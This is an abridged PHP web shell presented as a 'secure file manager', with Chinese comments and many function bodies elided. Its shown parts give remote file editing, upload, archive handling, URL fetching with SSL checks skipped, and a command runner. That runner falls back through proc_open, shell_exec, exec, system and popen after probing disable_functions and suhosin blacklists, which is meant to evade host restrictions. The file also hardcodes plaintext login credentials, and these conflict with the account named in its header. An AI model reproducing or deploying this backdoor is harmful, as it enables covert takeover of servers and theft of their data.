<?php
/**
 * BLUE — 安全文件管理器（单文件版）— 兼容新旧PHP版本
 *
 * 【账号信息】用户名: nyxcyber / 密码: n0t
 *
 * 主要兼容性改动（旧PHP → 新PHP）：
 * - 将所有短数组语法 [...] 替换为 array(...)
 * - 避免使用 null合并运算符(??) → 改用 isset(...)? ... : ...
 * - 移除 permsToString 中的匿名函数/闭包
 * - 添加辅助函数 is_fn_usable() 用于检测 disable_functions
 * - 命令执行器使用 is_fn_usable 以防 exec/system 被禁用
 * - 修复 fetchUrlToFile()（括号bug）+ array() 上下文
 * - 添加 fx_* 包装器，用于常被禁用的函数（可选使用）
 * - 添加 je() 替代 json_encode，兼容无 ext-json 的 PHP 5.x
 * - 移除 ZipArchive 类型提示，zip失败时回退到 tar（不使用 Phar::GZ）
 */
/* ========== 检测函数是否可用（未被 disable_functions 禁用）========== */
if (!function_exists('is_fn_usable')) {
    function is_fn_usable($fn) {
        // 如果函数本身不存在，直接返回不可用
        if (!function_exists($fn)) return false;

        // 尊重 disable_functions 和 suhosin 黑名单（兼容旧版本）
...
/* ---------- 认证配置（用户名与密码，明文） ---------- */
define('AUTH_USER', 'admin');               // 登录用户名
define('AUTH_PASS', 'demonex789');            // 登录密码（明文）

/* ---------- 工具函数 & 兼容性垫片 ---------- */
/** HTML转义函数，防止XSS攻击 */
function h($s){ return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }

/* JSON编码函数，兼容PHP 5.x（无ext-json时的简易回退） */
if (!function_exists('je')) {
    function je($v) {
        if (function_exists('json_encode')) {
            return json_encode($v);
        }
        // 简易回退（支持string/数字/bool/null）— 足够用于嵌入JS
...
/** hash_equals 兼容垫片（PHP < 5.6 时使用），安全比较两个字符串，防止时序攻击 */
...
/* 检测函数是否可用（未被 disable_functions/suhosin 禁用）—— 备份定义 */
if (!function_exists('is_fn_usable')) {
  function is_fn_usable($fn) {
      if (!function_exists($fn)) return false;

      $disabled = (string) @ini_get('disable_functions');
      $suhosin  = (string) @ini_get('suhosin.executor.func.blacklist'); // 兼容旧版本的suhosin扩展
...
/** 生成安全随机字节（多种回退方案，兼容旧PHP版本） */
function biru_random_bytes($len){
    if (is_fn_usable('random_bytes')) return random_bytes($len); // PHP 7+
    if (is_fn_usable('openssl_random_pseudo_bytes')) {             // OpenSSL扩展
        $strong = false;
        $b = openssl_random_pseudo_bytes($len, $strong);
        if ($b !== false && $strong) return $b;
    }
    $out = '';
    for ($i = 0; $i < $len; $i++) $out .= chr(mt_rand(0, 255)); // 最后回退：用mt_rand生成伪随机字节
    return $out;
}

/** 将字节数转换为人类可读的大小格式（如 1.5 MB） */
...
function permsToString($f){
    ...
    $s .= (($p & 0x0004) ? 'r' : '-') . (($p & 0x0002) ? 'w' : '-') . (($p & 0x0001) ? 'x' : '-'); // 其他用户权限 (world)
    return $t.$s;
}

/** 将用户输入的权限字符串转换为八进制模式值（如 '0755' → 0755） */
...
/** 判断文件是否为文本文件（先按扩展名判断，再按内容检测UTF-8） */
...
/** 尝试将临时文件写入目标位置（多种回退方案：move_uploaded_file → rename → copy → file_get+put → stream_copy） */
...
/** 从远程URL下载文件到本地（多种回退：cURL → copy → file_get+put → stream_copy） */
if (!function_exists('fetchUrlToFile')) {
  function fetchUrlToFile($url, $dest) {
      $errs = array();

      // 方法1）使用cURL下载（如果可用且未被禁用）
      ...
      // 为HTTP流包装器创建stream上下文（设置User-Agent、超时、跳过SSL验证）
...
function create_nonzero_file($path, $userContent = null){
    ...
    if ($payload === '') $payload = $default; // 确保文件非空

    // 方法1）file_put_contents 直接写入
...
/** 根据文件类型自动选择对应的SVG图标（文件夹/压缩包/图片/PDF/代码等） */
...
/* ---------- Shell辅助函数（构造cd前缀和包装命令） ---------- */
if(!function_exists('make_cd_prefix')){
    /** 生成切换目录的命令前缀（Windows: cd /d，Linux: cd） */
...
if(!function_exists('wrap_cmd_for_shell')){
    /** 将命令包装为对应系统的shell执行格式（Windows: cmd.exe /C，Linux: /bin/sh -c） */
...
/* ---------- 命令执行器（尊重 disable_functions，多种回退方案） ---------- */
if(!function_exists('run_with_proc_open')){
    /** 方法1）通过 proc_open 执行命令（支持超时控制） */
...
if(!function_exists('run_command_all')){
    /** 统一命令执行入口（按优先级尝试: proc_open → shell_exec → exec → system → popen） */
...
$action = isset($_GET['a']) ? $_GET['a'] : ''; // 获取操作类型

/* ---- 登录认证处理 ---- */
if ($action === 'login' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    ensureCsrf(); // 验证CSRF令牌
    $u = isset($_POST['user']) ? $_POST['user'] : ''; $p = isset($_POST['pass']) ? $_POST['pass'] : '';
    if (verify_login_creds($u,$p)) { $_SESSION['auth']=true; $_SESSION['who']=$u; header('Location: ?p='.rawurlencode($current)); exit; } // 登录成功，设置会话并跳转
    else { render_login('Incorrect username or password'); exit; } // 登录失败，显示错误信息
}
if (empty($_SESSION['auth'])) { render_login(); exit; } // 未登录则显示登录页面
...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ensureCsrf(); // 验证CSRF令牌
    $back = function () use ($current) { header('Location: ?p='.rawurlencode($current)); exit; }; // 返回当前目录的回调
    switch ($action) {
        case 'logout': { // 注销登录
        ...
        case 'edit-save': { // 保存编辑的文件内容（支持文本模式和Base64模式）
        ...
        case 'zip': { // 将选中的文件/目录压缩为ZIP（无ZipArchive时回退到TAR）
        ...
        case 'unzip': { // 解压缩文件到当前目录（支持ZIP和TAR格式）
            $file = safeJoin($current, isset($_POST['file']) ? $_POST['file'] : '');
...
/* ==== ZIP/TAR递归添加目录的辅助函数 ==== */
/** 递归将目录添加到ZipArchive对象中（移除类型提示以兼容无zip扩展的PHP） */
                      ...
                      <div class="row-actions"><a class="btn btn-xs btnw" href="?a=edit&f=<?php echo rawurlencode($name); ?>&p=<?php echo rawurlencode($current); ?>">Edit</a>
                        ...
                        <?php if (in_array($ext,array('zip')) || preg_match('~\.(tar|tar\.gz|tar\.bz2|tar\.xz)$~i', $name)): ?>
                          <form method="post" action="?a=unzip&p=<?php echo rawurlencode($current); ?>" class="inline">
                            ...
                            <button class="btn btn-xs btnw" type="submit">Unzip here</button></form>
                        <?php endif; ?>
...
<?php
/* ============================================================
 * 可选包装器（fx_*）—— 常被禁用函数的安全替代品
 * 当原始函数被 disable_functions 禁用时，提供回退方案
 * ============================================================ */

/** fx_stream_socket_client：网络套接字连接（回退到 fsockopen） */
...
/** fx_ini_restore：恢复INI配置项（不可用时静默忽略） */
...
/** fx_gzinflate：gzip解压缩（回退顺序: gzinflate → gzdecode → gzuncompress） */
...
/** fx_shell_exec：shell命令执行（被禁用时返回null） */
...
/** fx_system：system命令执行（被禁用时返回错误码127） */
...
/** fx_parse_ini_file：解析INI配置文件（回退到读取文件后用parse_ini_string） */
...
/** fx_show_source：显示PHP源码高亮（回退到highlight_file或直接输出） */
...
/** fx_scandir：扫描目录内容（回退到opendir+readdir） */
...
/** fx_posix_getpwuid：通过UID获取用户信息（不可用时返回当前用户） */
...
/** fx_posix_getgrgid：通过GID获取组信息（不可用时返回'unknown'） */
...
/** fx_diskfreespace：获取磁盘可用空间（回退到disk_free_space） */
...
/** fx_filegroup：获取文件所属组（不可用时返回false） */
...
/** fx_ftp_connect：FTP连接（回退到fsockopen） */
...
/** fx_stream_get_contents：读取流内容（回退到fread循环读取） */
